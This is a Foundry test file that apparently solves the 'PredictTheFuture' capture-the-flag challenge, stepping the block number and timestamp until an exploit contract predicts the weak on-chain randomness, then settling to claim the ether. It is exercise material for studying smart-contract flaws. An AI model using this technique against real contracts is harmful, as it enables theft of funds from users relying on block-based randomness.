// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        uint8 guess = 0;
        predictTheFuture.lockInGuess{value: 1 ether}(guess);
        for(uint256 n = 1; n < 100; n++) {
            vm.roll(104293 + n);
            vm.warp(93582192 + n * 12);

            bool canSettle = exploitContract.testSettle(guess);
            console.log("Iteration %s: %s", n, canSettle);
            if (canSettle) {
                predictTheFuture.settle();
                break;
            }
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
